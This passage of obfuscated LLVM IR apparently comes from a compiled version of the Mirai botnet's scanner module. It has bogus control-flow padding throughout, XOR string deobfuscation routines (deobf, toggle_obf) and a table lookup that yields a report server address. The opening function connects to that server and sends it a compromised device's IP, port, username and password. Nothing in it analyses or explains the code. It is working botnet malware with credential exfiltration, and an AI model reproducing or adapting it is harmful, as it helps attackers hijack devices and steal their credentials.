  %123 = call i64 @send(i32 %120, i8* %122, i64 1, i32 16384)
  %124 = load i32, i32* %9, align 4
  %125 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %126 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %125, i32 0, i32 1
  %127 = load i8*, i8** %126, align 8
  %128 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %129 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %128, i32 0, i32 5
  %130 = load i8, i8* %129, align 1
  %131 = zext i8 %130 to i64
  %132 = call i64 @send(i32 %124, i8* %127, i64 %131, i32 16384)
  %133 = load i32, i32* %9, align 4
  %134 = call i32 @close(i32 %133)
  call void @exit(i32 0) #8
  %135 = load i32, i32* @x.85
  %136 = load i32, i32* @y.86
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  unreachable

originalBBalteredBB:                              ; preds = %originalBB, %22
  call void @exit(i32 0) #8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %39
  call void @table_unlock_val(i8 zeroext 2)
  %143 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %143, align 4
  %144 = call i32 @inet_addr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.15, i32 0, i32 0)) #6
  %145 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %146 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %145, i32 0, i32 0
  store i32 %144, i32* %146, align 4
  %147 = call i8* @table_retrieve_val(i32 2, i32* null)
  %148 = bitcast i8* %147 to i16*
  %149 = load i16, i16* %148, align 2
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %149, i16* %150, align 2
  call void @table_lock_val(i8 zeroext 2)
  %151 = load i32, i32* %9, align 4
  %152 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %153 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  store %struct.sockaddr* %153, %struct.sockaddr** %152, align 8
  %154 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %155 = load %struct.sockaddr*, %struct.sockaddr** %154, align 8
  %156 = call i32 @connect(i32 %151, %struct.sockaddr* %155, i32 16)
  %157 = icmp eq i32 %156, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %71
  %158 = load i32, i32* %9, align 4
  %159 = call i32 @close(i32 %158)
  call void @exit(i32 0) #8
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %90
  store i8 0, i8* %11, align 1
  %160 = load i32, i32* %9, align 4
  %161 = call i64 @send(i32 %160, i8* %11, i64 1, i32 16384)
  %162 = load i32, i32* %9, align 4
  %163 = bitcast i32* %4 to i8*
  %164 = call i64 @send(i32 %162, i8* %163, i64 4, i32 16384)
  %165 = load i32, i32* %9, align 4
  %166 = bitcast i16* %5 to i8*
  %167 = call i64 @send(i32 %165, i8* %166, i64 2, i32 16384)
  %168 = load i32, i32* %9, align 4
  %169 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %170 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %169, i32 0, i32 4
  %171 = call i64 @send(i32 %168, i8* %170, i64 1, i32 16384)
  %172 = load i32, i32* %9, align 4
  %173 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %174 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %173, i32 0, i32 0
  %175 = load i8*, i8** %174, align 8
  %176 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %177 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %176, i32 0, i32 4
  %178 = load i8, i8* %177, align 4
  %179 = zext i8 %178 to i64
  %180 = call i64 @send(i32 %172, i8* %175, i64 %179, i32 16384)
  %181 = load i32, i32* %9, align 4
  %182 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %183 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %182, i32 0, i32 5
  %184 = call i64 @send(i32 %181, i8* %183, i64 1, i32 16384)
  %185 = load i32, i32* %9, align 4
  %186 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %187 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %186, i32 0, i32 1
  %188 = load i8*, i8** %187, align 8
  %189 = load %struct.scanner_auth*, %struct.scanner_auth** %6, align 8
  %190 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %189, i32 0, i32 5
  %191 = load i8, i8* %190, align 1
  %192 = zext i8 %191 to i64
  %193 = call i64 @send(i32 %185, i8* %188, i64 %192, i32 16384)
  %194 = load i32, i32* %9, align 4
  %195 = call i32 @close(i32 %194)
  call void @exit(i32 0) #8
  br label %originalBB10
}

; Function Attrs: noinline nounwind uwtable
define internal signext i8 @can_consume(%struct.scanner_connection*, i8*, i32) #0 {
  %4 = alloca %struct.scanner_connection*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %4, align 8
  store i8* %1, i8** %5, align 8
  store i32 %2, i32* %6, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %4, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 6
  %13 = load i32, i32* %12, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds i8, i8* %10, i64 %14
  store i8* %15, i8** %7, align 8
  %16 = load i8*, i8** %5, align 8
  %17 = load i32, i32* %6, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds i8, i8* %16, i64 %18
  %20 = load i8*, i8** %7, align 8
  %21 = icmp ult i8* %19, %20
  %22 = zext i1 %21 to i32
  %23 = trunc i32 %22 to i8
  ret i8 %23
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i64 @recv(i32, i8*, i64, i32) #3

declare void @util_zero(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define internal i8* @deobf(i8*, i32*) #0 {
  %3 = load i32, i32* @x.89
  %4 = load i32, i32* @y.90
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  store i8* %0, i8** %11, align 8
  store i32* %1, i32** %12, align 8
  %15 = load i8*, i8** %11, align 8
  %16 = call i32 @util_strlen(i8* %15)
  %17 = load i32*, i32** %12, align 8
  store i32 %16, i32* %17, align 4
  %18 = load i32*, i32** %12, align 8
  %19 = load i32, i32* %18, align 4
  %20 = add nsw i32 %19, 1
  %21 = sext i32 %20 to i64
  %22 = call noalias i8* @malloc(i64 %21) #6
  store i8* %22, i8** %14, align 8
  %23 = load i8*, i8** %14, align 8
  %24 = load i8*, i8** %11, align 8
  %25 = load i32*, i32** %12, align 8
  %26 = load i32, i32* %25, align 4
  %27 = add nsw i32 %26, 1
  call void @util_memcpy(i8* %23, i8* %24, i32 %27)
  store i32 0, i32* %13, align 4
  %28 = load i32, i32* @x.89
  %29 = load i32, i32* @y.90
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %36

; <label>:36:                                     ; preds = %originalBBpart250, %originalBBpart2
  %37 = load i32, i32* %13, align 4
  %38 = load i32*, i32** %12, align 8
  %39 = load i32, i32* %38, align 4
  %40 = icmp slt i32 %37, %39
  br i1 %40, label %41, label %109

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* @x.89
  %43 = load i32, i32* @y.90
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %41
  %50 = load i8*, i8** %14, align 8
  %51 = load i32, i32* %13, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds i8, i8* %50, i64 %52
  %54 = load i8, i8* %53, align 1
  %55 = sext i8 %54 to i32
  %56 = xor i32 %55, 222
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %53, align 1
  %58 = load i8*, i8** %14, align 8
  %59 = load i32, i32* %13, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %58, i64 %60
  %62 = load i8, i8* %61, align 1
  %63 = sext i8 %62 to i32
  %64 = xor i32 %63, 222
  %65 = trunc i32 %64 to i8
  store i8 %65, i8* %61, align 1
  %66 = load i8*, i8** %14, align 8
  %67 = load i32, i32* %13, align 4
  %68 = sext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %66, i64 %68
  %70 = load i8, i8* %69, align 1
  %71 = sext i8 %70 to i32
  %72 = xor i32 %71, 251
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %69, align 1
  %74 = load i8*, i8** %14, align 8
  %75 = load i32, i32* %13, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %74, i64 %76
  %78 = load i8, i8* %77, align 1
  %79 = sext i8 %78 to i32
  %80 = xor i32 %79, 175
  %81 = trunc i32 %80 to i8
  store i8 %81, i8* %77, align 1
  %82 = load i32, i32* @x.89
  %83 = load i32, i32* @y.90
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart236, label %originalBB19alteredBB

originalBBpart236:                                ; preds = %originalBB19
  br label %90

; <label>:90:                                     ; preds = %originalBBpart236
  %91 = load i32, i32* @x.89
  %92 = load i32, i32* @y.90
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %90
  %99 = load i32, i32* %13, align 4
  %100 = add nsw i32 %99, 1
  store i32 %100, i32* %13, align 4
  %101 = load i32, i32* @x.89
  %102 = load i32, i32* @y.90
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart250, label %originalBB38alteredBB

originalBBpart250:                                ; preds = %originalBB38
  br label %36

; <label>:109:                                    ; preds = %36
  %110 = load i32, i32* @x.89
  %111 = load i32, i32* @y.90
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %109
  %118 = load i8*, i8** %14, align 8
  %119 = load i32, i32* @x.89
  %120 = load i32, i32* @y.90
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  ret i8* %118

originalBBalteredBB:                              ; preds = %originalBB, %2
  %127 = alloca i8*, align 8
  %128 = alloca i32*, align 8
  %129 = alloca i32, align 4
  %130 = alloca i8*, align 8
  store i8* %0, i8** %127, align 8
  store i32* %1, i32** %128, align 8
  %131 = load i8*, i8** %127, align 8
  %132 = call i32 @util_strlen(i8* %131)
  %133 = load i32*, i32** %128, align 8
  store i32 %132, i32* %133, align 4
  %134 = load i32*, i32** %128, align 8
  %135 = load i32, i32* %134, align 4
  %_ = shl i32 %135, 1
  %_1 = sub i32 %135, 1
  %gen = mul i32 %_1, 1
  %_2 = sub i32 0, %135
  %gen3 = add i32 %_2, 1
  %_4 = shl i32 %135, 1
  %_5 = sub i32 %135, 1
  %gen6 = mul i32 %_5, 1
  %_7 = shl i32 %135, 1
  %_8 = shl i32 %135, 1
  %136 = add nsw i32 %135, 1
  %137 = sext i32 %136 to i64
  %138 = call noalias i8* @malloc(i64 %137) #6
  store i8* %138, i8** %130, align 8
  %139 = load i8*, i8** %130, align 8
  %140 = load i8*, i8** %127, align 8
  %141 = load i32*, i32** %128, align 8
  %142 = load i32, i32* %141, align 4
  %_9 = sub i32 %142, 1
  %gen10 = mul i32 %_9, 1
  %_11 = sub i32 %142, 1
  %gen12 = mul i32 %_11, 1
  %_13 = sub i32 %142, 1
  %gen14 = mul i32 %_13, 1
  %_15 = sub i32 0, %142
  %gen16 = add i32 %_15, 1
  %_17 = sub i32 %142, 1
  %gen18 = mul i32 %_17, 1
  %143 = add nsw i32 %142, 1
  call void @util_memcpy(i8* %139, i8* %140, i32 %143)
  store i32 0, i32* %129, align 4
  br label %originalBB

originalBB19alteredBB:                            ; preds = %originalBB19, %41
  %144 = load i8*, i8** %14, align 8
  %145 = load i32, i32* %13, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds i8, i8* %144, i64 %146
  %148 = load i8, i8* %147, align 1
  %149 = sext i8 %148 to i32
  %_20 = sub i32 %149, 222
  %gen21 = mul i32 %_20, 222
  %150 = xor i32 %149, 222
  %151 = trunc i32 %150 to i8
  store i8 %151, i8* %147, align 1
  %152 = load i8*, i8** %14, align 8
  %153 = load i32, i32* %13, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8, i8* %152, i64 %154
  %156 = load i8, i8* %155, align 1
  %157 = sext i8 %156 to i32
  %_22 = sub i32 %157, 222
  %gen23 = mul i32 %_22, 222
  %_24 = sub i32 %157, 222
  %gen25 = mul i32 %_24, 222
  %_26 = sub i32 %157, 222
  %gen27 = mul i32 %_26, 222
  %_28 = shl i32 %157, 222
  %_29 = shl i32 %157, 222
  %_30 = sub i32 0, %157
  %gen31 = add i32 %_30, 222
  %158 = xor i32 %157, 222
  %159 = trunc i32 %158 to i8
  store i8 %159, i8* %155, align 1
  %160 = load i8*, i8** %14, align 8
  %161 = load i32, i32* %13, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds i8, i8* %160, i64 %162
  %164 = load i8, i8* %163, align 1
  %165 = sext i8 %164 to i32
  %_32 = shl i32 %165, 251
  %166 = xor i32 %165, 251
  %167 = trunc i32 %166 to i8
  store i8 %167, i8* %163, align 1
  %168 = load i8*, i8** %14, align 8
  %169 = load i32, i32* %13, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8, i8* %168, i64 %170
  %172 = load i8, i8* %171, align 1
  %173 = sext i8 %172 to i32
  %_33 = sub i32 %173, 175
  %gen34 = mul i32 %_33, 175
  %174 = xor i32 %173, 175
  %175 = trunc i32 %174 to i8
  store i8 %175, i8* %171, align 1
  br label %originalBB19

originalBB38alteredBB:                            ; preds = %originalBB38, %90
  %176 = load i32, i32* %13, align 4
  %_39 = sub i32 0, %176
  %gen40 = add i32 %_39, 1
  %_41 = shl i32 %176, 1
  %_42 = shl i32 %176, 1
  %_43 = sub i32 0, %176
  %gen44 = add i32 %_43, 1
  %_45 = shl i32 %176, 1
  %_46 = sub i32 %176, 1
  %gen47 = mul i32 %_46, 1
  %_48 = shl i32 %176, 1
  %177 = add nsw i32 %176, 1
  store i32 %177, i32* %13, align 4
  br label %originalBB38

originalBB52alteredBB:                            ; preds = %originalBB52, %109
  %178 = load i8*, i8** %14, align 8
  br label %originalBB52
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

; <label>:27:                                     ; preds = %99, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %102

; <label>:34:                                     ; preds = %27
  %35 = load i32, i32* @x.93
  %36 = load i32, i32* @y.94
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i8, i8* %5, align 1
  %44 = zext i8 %43 to i32
  %45 = load %struct.table_value*, %struct.table_value** %4, align 8
  %46 = getelementptr inbounds %struct.table_value, %struct.table_value* %45, i32 0, i32 0
  %47 = load i8*, i8** %46, align 8
  %48 = load i32, i32* %3, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = sext i8 %51 to i32
  %53 = xor i32 %52, %44
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %50, align 1
  %55 = load i8, i8* %6, align 1
  %56 = zext i8 %55 to i32
  %57 = load %struct.table_value*, %struct.table_value** %4, align 8
  %58 = getelementptr inbounds %struct.table_value, %struct.table_value* %57, i32 0, i32 0
  %59 = load i8*, i8** %58, align 8
  %60 = load i32, i32* %3, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = xor i32 %64, %56
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %62, align 1
  %67 = load i8, i8* %7, align 1
  %68 = zext i8 %67 to i32
  %69 = load %struct.table_value*, %struct.table_value** %4, align 8
  %70 = getelementptr inbounds %struct.table_value, %struct.table_value* %69, i32 0, i32 0
  %71 = load i8*, i8** %70, align 8
  %72 = load i32, i32* %3, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = xor i32 %76, %68
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %74, align 1
  %79 = load i8, i8* %8, align 1
  %80 = zext i8 %79 to i32
  %81 = load %struct.table_value*, %struct.table_value** %4, align 8
  %82 = getelementptr inbounds %struct.table_value, %struct.table_value* %81, i32 0, i32 0
  %83 = load i8*, i8** %82, align 8
  %84 = load i32, i32* %3, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* %83, i64 %85
  %87 = load i8, i8* %86, align 1
  %88 = sext i8 %87 to i32
  %89 = xor i32 %88, %80
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %86, align 1
  %91 = load i32, i32* @x.93
  %92 = load i32, i32* @y.94
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %99

; <label>:99:                                     ; preds = %originalBBpart2
  %100 = load i32, i32* %3, align 4
  %101 = add nsw i32 %100, 1
  store i32 %101, i32* %3, align 4
  br label %27

; <label>:102:                                    ; preds = %27
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %34
  %103 = load i8, i8* %5, align 1
  %104 = zext i8 %103 to i32
  %105 = load %struct.table_value*, %struct.table_value** %4, align 8
  %106 = getelementptr inbounds %struct.table_value, %struct.table_value* %105, i32 0, i32 0
  %107 = load i8*, i8** %106, align 8
  %108 = load i32, i32* %3, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i8, i8* %110, align 1
  %112 = sext i8 %111 to i32
  %_ = sub i32 0, %112
  %gen = add i32 %_, %104
  %113 = xor i32 %112, %104
  %114 = trunc i32 %113 to i8
  store i8 %114, i8* %110, align 1
  %115 = load i8, i8* %6, align 1
  %116 = zext i8 %115 to i32
  %117 = load %struct.table_value*, %struct.table_value** %4, align 8
  %118 = getelementptr inbounds %struct.table_value, %struct.table_value* %117, i32 0, i32 0
  %119 = load i8*, i8** %118, align 8
  %120 = load i32, i32* %3, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8, i8* %119, i64 %121
  %123 = load i8, i8* %122, align 1
  %124 = sext i8 %123 to i32
  %_1 = sub i32 0, %124
  %gen2 = add i32 %_1, %116
  %_3 = shl i32 %124, %116
  %_4 = shl i32 %124, %116
  %_5 = sub i32 0, %124
  %gen6 = add i32 %_5, %116
  %_7 = sub i32 %124, %116
  %gen8 = mul i32 %_7, %116
  %_9 = shl i32 %124, %116
  %_10 = sub i32 %124, %116
  %gen11 = mul i32 %_10, %116
  %_12 = shl i32 %124, %116
  %125 = xor i32 %124, %116
  %126 = trunc i32 %125 to i8
  store i8 %126, i8* %122, align 1
  %127 = load i8, i8* %7, align 1
  %128 = zext i8 %127 to i32
  %129 = load %struct.table_value*, %struct.table_value** %4, align 8
  %130 = getelementptr inbounds %struct.table_value, %struct.table_value* %129, i32 0, i32 0
  %131 = load i8*, i8** %130, align 8
  %132 = load i32, i32* %3, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8, i8* %131, i64 %133
  %135 = load i8, i8* %134, align 1
  %136 = sext i8 %135 to i32
  %_13 = shl i32 %136, %128
  %137 = xor i32 %136, %128
  %138 = trunc i32 %137 to i8
  store i8 %138, i8* %134, align 1
  %139 = load i8, i8* %8, align 1
  %140 = zext i8 %139 to i32
  %141 = load %struct.table_value*, %struct.table_value** %4, align 8
  %142 = getelementptr inbounds %struct.table_value, %struct.table_value* %141, i32 0, i32 0
  %143 = load i8*, i8** %142, align 8
  %144 = load i32, i32* %3, align 4
  %145 = sext i32 %144 to i64
  %146 = getelementptr inbounds i8, i8* %143, i64 %145
  %147 = load i8, i8* %146, align 1
  %148 = sext i8 %147 to i32
  %_14 = shl i32 %148, %140
  %_15 = shl i32 %148, %140
  %_16 = sub i32 %148, %140
  %gen17 = mul i32 %_16, %140
  %_18 = shl i32 %148, %140
  %149 = xor i32 %148, %140
  %150 = trunc i32 %149 to i8
  store i8 %150, i8* %146, align 1
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = load i32, i32* @x.95
  %3 = load i32, i32* @y.96
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8, align 1
  %11 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %10, align 1
  %12 = load i8, i8* %10, align 1
  %13 = zext i8 %12 to i64
  %14 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %13
  store %struct.table_value* %14, %struct.table_value** %11, align 8
  %15 = load i8, i8* %10, align 1
  call void @toggle_obf(i8 zeroext %15)
  %16 = load i32, i32* @x.95
  %17 = load i32, i32* @y.96
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %24 = alloca i8, align 1
  %25 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %24, align 1
  %26 = load i8, i8* %24, align 1
  %27 = zext i8 %26 to i64
  %28 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %27
  store %struct.table_value* %28, %struct.table_value** %25, align 8
  %29 = load i8, i8* %24, align 1
  call void @toggle_obf(i8 zeroext %29)
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [31 x %struct.table_value], [31 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load i32, i32* @x.97
  %19 = load i32, i32* @y.98
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load %struct.table_value*, %struct.table_value** %5, align 8
  %27 = getelementptr inbounds %struct.table_value, %struct.table_value* %26, i32 0, i32 0
  %28 = load i8*, i8** %27, align 8
  %29 = load i32, i32* @x.97
  %30 = load i32, i32* @y.98
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8* %28

originalBBalteredBB:                              ; preds = %originalBB, %17
  %37 = load %struct.table_value*, %struct.table_value** %5, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = load i32, i32* @x.99
  %6 = load i32, i32* @y.100
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

